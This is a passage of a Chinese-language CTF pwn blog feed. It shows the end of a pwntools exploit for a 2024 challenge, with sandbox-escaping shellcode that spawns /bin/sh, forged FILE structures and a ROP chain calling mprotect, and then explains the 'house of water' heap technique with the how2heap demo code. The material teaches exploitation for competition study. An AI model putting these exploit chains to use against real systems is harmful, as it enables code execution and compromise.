0              /* are we the child process? */</span></span><br><span class="line"><span class="string">    je child_process        /* if yes, jump to child_process */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">parent_process:</span></span><br><span class="line"><span class="string">    /* Store child PID */</span></span><br><span class="line"><span class="string">    mov r8,rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rsi, r8            /* rdi = child PID */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Attach to child process */</span></span><br><span class="line"><span class="string">    mov rax, 101            /* syscall number for ptrace */</span></span><br><span class="line"><span class="string">    mov rdi, 0x10           /* PTRACE_ATTACH */</span></span><br><span class="line"><span class="string">    xor rdx, rdx            /* no options */</span></span><br><span class="line"><span class="string">    xor r10, r10            /* no data */</span></span><br><span class="line"><span class="string">    syscall                 /* invoke ptrace(PTRACE_ATTACH, child_pid, 0, 0) */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">monitor_child:</span></span><br><span class="line"><span class="string">    /* Wait for the child to stop */</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov rdi, r8            /* rdi = child PID */</span></span><br><span class="line"><span class="string">    mov rsi, rsp            /*  no status*/</span></span><br><span class="line"><span class="string">    xor rdx, rdx            /* no options */</span></span><br><span class="line"><span class="string">    xor r10, r10            /* no rusage */</span></span><br><span class="line"><span class="string">    mov rax, 61             /* syscall number for wait4 */</span></span><br><span class="line"><span class="string">    syscall                 /* invoke wait4() */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Set ptrace options */</span></span><br><span class="line"><span class="string">    mov rax, 110</span></span><br><span class="line"><span class="string">    syscall    </span></span><br><span class="line"><span class="string">    mov rdi, 0x4200         /* PTRACE_SETOPTIONS */</span></span><br><span class="line"><span class="string">    mov rsi, r8            /* rsi = child PID */</span></span><br><span class="line"><span class="string">    xor rdx, rdx            /* no options */</span></span><br><span class="line"><span class="string">    mov r10, 0x00000080     /* PTRACE_O_TRACESECCOMP */</span></span><br><span class="line"><span class="string">    mov rax, 101            /* syscall number for ptrace */</span></span><br><span class="line"><span class="string">    syscall                 /* invoke ptrace(PTRACE_SETOPTIONS, child_pid, 0, 0) */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Allow the child process to continue */</span></span><br><span class="line"><span class="string">    mov rax, 110</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov rdi, 0x7            /* PTRACE_CONT */</span></span><br><span class="line"><span class="string">    mov rsi, r8            /* rsi = child PID */</span></span><br><span class="line"><span class="string">    xor rdx, rdx            /* no options */</span></span><br><span class="line"><span class="string">    xor r10, r10            /* no data */</span></span><br><span class="line"><span class="string">    mov rax, 101            /* syscall number for ptrace */</span></span><br><span class="line"><span class="string">    syscall                 /* invoke ptrace(PTRACE_CONT, child_pid, 0, 0) */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Loop to keep monitoring the child */</span></span><br><span class="line"><span class="string">    jmp monitor_child</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">child_process:</span></span><br><span class="line"><span class="string">    /* Child process code here */</span></span><br><span class="line"><span class="string">    /* For example, we could execute a shell or perform other actions */</span></span><br><span class="line"><span class="string">    /* To keep it simple, let&#x27;s just execute `/bin/sh` */</span></span><br><span class="line"><span class="string">                </span></span><br><span class="line"><span class="string">    /* sleep(5) */</span></span><br><span class="line"><span class="string">    /* push 0 */</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    dec byte ptr [rsp]</span></span><br><span class="line"><span class="string">    /* push 5 */</span></span><br><span class="line"><span class="string">    push 5</span></span><br><span class="line"><span class="string">    /* nanosleep(requested_time=&#x27;rsp&#x27;, remaining=0) */</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    xor esi, esi /* 0 */</span></span><br><span class="line"><span class="string">    /* call nanosleep() */</span></span><br><span class="line"><span class="string">    push SYS_nanosleep /* 0x23 */</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, 0x<span class="subst">&#123;order2&#125;</span>  /* &quot;/bin/sh&quot; */</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    mov rax, 0x<span class="subst">&#123;order1&#125;</span>  /* &quot;/bin/sh&quot; */</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    mov rdi, rsp    </span></span><br><span class="line"><span class="string">    mov rsi, 0</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    mov rax, 59             /* syscall number for execve */</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    jmp child_process</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">_exit:</span></span><br><span class="line"><span class="string">    /* Exit the process */</span></span><br><span class="line"><span class="string">    mov rax, 60             /* syscall number for exit */</span></span><br><span class="line"><span class="string">    xor rdi, rdi            /* status 0 */</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,shellcode)</span><br><span class="line"></span><br><span class="line">target = libc_base + libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]</span><br><span class="line"></span><br><span class="line">stderr = libc_base + libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]</span><br><span class="line">setcontext = libc_base + libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">magic_gadget = libc_base + <span class="number">0x000000000008c385</span></span><br><span class="line">mprotect = libc_base + libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">pop_rax_call_rax = libc_base + <span class="number">0x000000000015f288</span></span><br><span class="line"></span><br><span class="line">fake_io_read = flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>: <span class="number">0x8000</span> | <span class="number">0x40</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: heap_base + <span class="number">0x5000</span>, <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x500</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: heap_base + <span class="number">0x5000</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] - <span class="number">0x8</span>, <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,fake_io_read[<span class="number">0x10</span>:])</span><br><span class="line">bye()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_io_write = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: <span class="number">0x8000</span> | <span class="number">0x800</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: libc_base+libc.symbols[<span class="string">&quot;environ&quot;</span>], <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: libc_base+libc.symbols[<span class="string">&quot;environ&quot;</span>] + <span class="number">8</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x100</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">1</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>], <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload = fake_io_write.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_io_read = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: <span class="number">0x8000</span> | <span class="number">0x40</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x200</span>, <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x500</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x200</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] - <span class="number">0x8</span>, <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += fake_io_read.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">stack = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg(<span class="string">&quot;stack&quot;</span>)</span><br><span class="line">target = stack - <span class="number">720</span></span><br><span class="line">lg(<span class="string">&#x27;target&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_io_read = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: <span class="number">0x8000</span> | <span class="number">0x40</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: target, <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: target + <span class="number">0x200</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: <span class="number">0</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] - <span class="number">0x8</span>, <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(fake_io_read)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x0000000000023b65</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x00000000000251be</span></span><br><span class="line">pop_rdx_ret = libc_base + <span class="number">0x0000000000166262</span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x000000000003fa43</span></span><br><span class="line">pop_rcx_ret = libc_base + <span class="number">0x0000000000099a83</span></span><br><span class="line">pop_rbp_ret = libc_base + <span class="number">0x0000000000023a60</span></span><br><span class="line"></span><br><span class="line">shellcode_addr = heap_base + <span class="number">0x7b0</span></span><br><span class="line"></span><br><span class="line">payload = flat([</span><br><span class="line">    pop_rdi_ret, heap_base,</span><br><span class="line">    pop_rsi_ret, <span class="number">0x2000</span>,</span><br><span class="line">    pop_rdx_ret, <span class="number">7</span>,</span><br><span class="line">    mprotect, </span><br><span class="line">    pop_rbp_ret, heap_base + <span class="number">0x3000</span>,</span><br><span class="line">    pop_rax_call_rax, shellcode_addr</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行后即可稳定拿 <code>shell</code>，效果如下：</p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/12.png" class="" title="我的图图呢">  <p>可是这个 <code>shell</code> 并不能使用 <code>ls、cat</code> 这些指令，只能使用 <code>cd、pwd、echo</code> 这种比较基本的，而且 <code>echo</code> 的功能还不全，下面给出一些可以用来平替的脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ls</span></span><br><span class="line"><span class="built_in">echo</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># cat flag</span></span><br><span class="line"><span class="keyword">while</span> IFS = <span class="built_in">read</span> -r line; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$line</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span> &lt; flag</span><br></pre></td></tr></table></figure><p>效果如下：</p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/13.png" class="" title="我的图图呢">  <p>那为什么 <code>ls、cat</code> 等指令无法使用呢？这里以 <code>ls</code> 为例解释一下：<br>ls命令的实现可以分为以下几个步骤：  </p><ol><li><p>打开目录：首先，需要打开要列出文件的目录。可以使用 <code>open()</code> 系统调用来打开目录，并获得一个目录文件描述符。  </p></li><li><p>读取目录项：通过 <code>readdir()</code> 系统调用，可以从打开的目录中读取目录项。<code>readdir()</code> 会返回一个指向目录项结构体的指针。通过循环调用 <code>readdir()</code>，可以逐个读取目录中的文件。  </p></li><li><p>过滤隐藏文件：在读取目录项之后，需要对目录项进行过滤。Linux中的隐藏文件以.开头，可以通过判断目录项的名字的第一个字符是否为.来过滤隐藏文件。  </p></li><li><p>输出目录项信息：读取到一个目录项之后，可以通过目录项结构体中的字段获取文件的属性信息，比如文件名、大小、修改时间等。可以使用 <code>printf()</code> 函数将这些信息输出到终端。  </p></li><li><p>关闭目录：使用 <code>closedir()</code> 系统调用来关闭打开的目录，释放资源。</p></li></ol><p>可以看到执行 <code>ls</code> 命令需要使用 <code>open</code> 系统调用，可是我们拿到的 <code>shell</code> 依然处于沙箱的环境中，<code>open</code> 系统调用给禁止使用，这也意味着我们无法使用 <code>ls</code> 命令</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>house of water &amp; TFCCTF 2024 MCGUAVA</title>
      <link href="/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/"/>
      <url>/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/</url>
      
        <content type="html"><![CDATA[<h2 id="house-of-water"><a href="#house-of-water" class="headerlink" title="house of water"></a>house of water</h2><p>早就听 Csome 学长说过有种打法叫 house of water，但是当时没去看，时间久了就忘记这个东西了，现在记起来了就来学习一下。由于笔者的水平有限，文章不免会出现许多错误，希望各位师傅能过包容以及指正。这篇文章的程序的测试环境为 ubuntu 22.04.3 TLS。</p><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>这个打法由国际战队 blue water 提出的，下面来看看该团队对这个打法的描述：</p><blockquote><p>House of Water is a technique for converting a Use-After-Free (UAF) vulnerability into a t-cache<br>metadata control primitive, with the added benefit of obtaining a free libc pointer in the<br>t-cache metadata as well.</p><p>NOTE: This requires 4 bits of bruteforce if the primitive is a write primitive, as the LSB will<br>contain 4 bits of randomness. If you can increment integers, no brutefore is required.</p><p>By setting the count of t-cache entries 0x3e0 and 0x3f0 to 1, a “fake” heap chunk header of<br>size “0x10001” is created.</p><p>This fake heap chunk header happens to be positioned above the 0x20 and 0x30 t-cache linked<br>address entries, enabling the creation of a fully functional fake unsorted-bin entry.</p><p>The correct size should be set for the chunk, and the next chunk’s prev-in-use bit<br>must be 0. Therefore, from the fake t-cache metadata chunk+0x10000, the appropriate values<br>should be written.</p><p>Finally, due to the behavior of allocations from unsorted-bins, once t-cache metadata control<br>is achieved, a libc pointer can also be inserted into the metadata. This allows the libc pointer<br>to be ready for allocation as well.</p><p>Technique &#x2F; house by @udp_ctf - Water Paddler &#x2F; Blue Water </p></blockquote><p>相信大多数人都没看懂（感觉是我理解力有待提高😭），不过不用着急，接下来我会进行比较详细的讲解。<br>该打法的利用前置条件如下：</p><blockquote><p>程序存在UAF漏洞<br>程序可以申请住够大的堆块</p></blockquote><p>这里需要注意的是，完成该打法不需要泄露任何内存地址且不需要任何堆上的溢出<br>最终的效果是能够在 tcache 的链表上留下 libc 的相关地址，并将其申请出来，效果如下：</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/1.png" class="" title="我的图图呢">  <p>当程序开始运行并遇到它的第一个 malloc 时，堆（main arena）将被初始化。默认情况下（libc 2.31+），将分配 0x290 的内存大小来存储 tcache_perthread_struct 结构体，该结构体存储各个不同 size 的 tcache 链表的 chunk 的个数以及最后进入链表的 chunk 的 data 区域地址。 该结构体的源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure><p>我们最终的目的是在这个结构体中的 entries 区域留下 libc 的相关地址，进而让我们能够申请 libc 上的内存</p><h3 id="Attack-Demo"><a href="#Attack-Demo" class="headerlink" title="Attack Demo"></a>Attack Demo</h3><p>这里我们选用 how2heap 中的 <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.39/house_of_water.c">house of water</a> 这个例子来解释，这里我做了一些简单的修改，把一些英文段落进行了删除，只留下程序执行代码</p><h4 id="house-of-water-c"><a href="#house-of-water-c" class="headerlink" title="house_of_water.c"></a>house_of_water.c</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Ubuntu 22.04.3 LTS</span></span><br><span class="line"><span class="comment">// gcc -g house_of_water.c -o test</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"><span class="type">void</span> *_ = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *fake_size_lsb = <span class="built_in">malloc</span>(<span class="number">0x3d8</span>);</span><br><span class="line"><span class="type">void</span> *fake_size_msb = <span class="built_in">malloc</span>(<span class="number">0x3e8</span>);</span><br><span class="line"><span class="built_in">free</span>(fake_size_lsb);</span><br><span class="line"><span class="built_in">free</span>(fake_size_msb);</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *metadata = (<span class="type">void</span> *)((<span class="type">long</span>)(fake_size_lsb) &amp; ~(<span class="number">0xfff</span>));</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *x[<span class="number">7</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">x[i] = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *unsorted_start = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line">_ = <span class="built_in">malloc</span>(<span class="number">0x18</span>); <span class="comment">// Guard chunk</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *unsorted_middle = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line">_ = <span class="built_in">malloc</span>(<span class="number">0x18</span>); <span class="comment">// Guard chunk</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *unsorted_end = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line">_ = <span class="built_in">malloc</span>(<span class="number">0x18</span>); <span class="comment">// Guard chunk</span></span><br><span class="line"></span><br><span class="line">_ = <span class="built_in">malloc</span>(<span class="number">0xf000</span>);  <span class="comment">// Padding</span></span><br><span class="line"><span class="type">void</span> *end_of_fake = <span class="built_in">malloc</span>(<span class="number">0x18</span>); <span class="comment">// Metadata chunk</span></span><br><span class="line"></span><br><span class="line">*(<span class="type">long</span> *)end_of_fake = <span class="number">0x10000</span>;</span><br><span class="line">*(<span class="type">long</span> *)(end_of_fake+<span class="number">0x8</span>) = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line"><span class="built_in">free</span>(x[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">*(<span class="type">long</span>*)(unsorted_start<span class="number">-0x18</span>) = <span class="number">0x31</span>; </span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(unsorted_start<span class="number">-0x10</span>); <span class="comment">// Create a fake FWD</span></span><br><span class="line"></span><br><span class="line">*(<span class="type">long</span>*)(unsorted_start<span class="number">-0x8</span>) = <span class="number">0x91</span>; </span><br><span class="line"></span><br><span class="line">*(<span class="type">long</span>*)(unsorted_end<span class="number">-0x18</span>) = <span class="number">0x21</span>; </span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(unsorted_end<span class="number">-0x10</span>); <span class="comment">// Create a fake BCK</span></span><br><span class="line"></span><br><span class="line">*(<span class="type">long</span>*)(unsorted_end<span class="number">-0x8</span>) = <span class="number">0x91</span>; </span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(unsorted_end);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(unsorted_middle);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(unsorted_start);</span><br><span class="line"></span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> *)unsorted_start = (<span class="type">unsigned</span> <span class="type">long</span>)(metadata+<span class="number">0x80</span>);</span><br><span class="line"> </span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> *)(unsorted_end+<span class="number">0x8</span>) = (<span class="type">unsigned</span> <span class="type">long</span>)(metadata+<span class="number">0x80</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Next allocation *could* be our faked chunk!</span></span><br><span class="line"><span class="type">void</span> *meta_chunk = <span class="built_in">malloc</span>(<span class="number">0x288</span>);</span><br><span class="line"></span><br><span class="line">assert(meta_chunk == (metadata+<span class="number">0x90</span>)); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为在编译阶段我们使用了“-g”参数，可以使用gdb在任意行下断点<code>b + 行号</code><br>接下来对这段 demo 进行调试<br>将断点下到第 18 行，此时程序完成的操作如下：<br>申请了 2 个堆块，size 分别为 0x3e0 和 0x3f0，紧接着将其释放掉<br>我们来看看此时的 tcache_perthread_struct 结构体：</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/2.png" class="" title="我的图图呢"><p>可以看到第二个框框的地方的地址就是我们刚才释放的 2 个堆块地址，而第一个框框则是 size 为 0x3e0 和 0x3f0 对应的 tcache 链表 chunk 的个数，然而这个 heapbase+0x88 这个 0x10001 可以作为我们fake chunk 的size，如果我们将这个地方作为 fake chunk 并放入 unsorted bin（后面称这个 chunk 为 fake unsorted chunk），我们就能够在 tcache_perthread_struct 结构体上踩上 libc 的地址。<br>接下来将断点下到第 0x38 行，这期间做的都是堆块申请工作：<br>连续申请了 7 个 0x90 大小的 chunk，然后交替申请 0x90 和 0x20 大小的 chunk。我们最终希望最后申请的 3 个 0x90 大小的chunk 可以进入 unsorted bin，所以每 2 个 chunk 之间都申请一个小堆块来防止他们合并。这里将要进入 unsorted bin 的三个 chunk 分别命名为：unsorted_start、unsorted_middle、unsorted_end。很好理解吧，开始、中间、结束😋<br>最后还申请了一个特别大的 chunk，size 为 0xf0010，后面紧接着一个 size 为 0x20 的小 chunk<br>接着将断点下到第 41 行，这里在最后那个 size 为 0x20 的 chunk 的 fd 位置写上 0x1000，在 bk 位置写上 0x20。</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/3.png" class="" title="我的图图呢"><p>这样做是为了绕过 unsorted bin的检测。我们回到最初的 fake unsorted chunk 的位置，其起始地址为0x555555559080</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/4.png" class="" title="我的图图呢"><p>我们需要让这个 chunk 在 unsorted bin 中合法，我们就需要在让这样 fake unsorted chunk 在结束的时候的下个 chunk 的 prev_size 为 0x10000，且 size 的 issue 位为 0（因为 unsorted bin 中的堆块都是已经释放过的未使用的）<br>接下来就是对这个 fake unsorted chunk 进行装修<br>将断点下在第 57 行，此时 bin 的结构如下：</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/5.png" class="" title="我的图图呢"><p>期间做的操作就是将最开始申请的 7 个 0x90 大小的 chunk 给释放掉（将 size 为 0x90 大小的 tcache 链表给填满，确保后面三个 0x90 大小的堆块给释放后能够进入到 unsorted bin），然后在 unsorted_start 和 unsorted_end 上方分别伪造一个小堆块然后释放掉，这里主要讲解一下堆块的伪造<br>对于 unsorted_start 上方堆块的伪造，我们直接在 unsorted_start-0x8 的地方填上 0x31 来当作 fake chunk 的 size 然后直接释放（这个 size 是有讲究的，后面会解释到），unstorted_end 的做法也类似，不过 fake chunk 的大小为 0x20。在将 fake chunk 给释放后由于堆块进入 tcache 链表后 fd+8 的地方会填上一个 key，这个 key 的作用是用来检测 tcache 上是否出现 double free，这个 key 的存在破坏了原先 unsorted_start 和 unsorted_end 这 2 个堆块的 size 位，所以我们要给予恢复，第 50 和 第 56 行的代码的作用就是如此。<br>那么伪造 2 个 fake chunk 然后 释放掉有什么意义呢？<br>我们回到前面，前面说过接下来的操作是为了对要进入 unsorted bin 的  fake unsorted chunk 进行装修，而 unsorted bin 是存在 fd 和 bk 指针的，此时再来看看我们的 fake unsorted chunk</p><img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/6.png" class="" 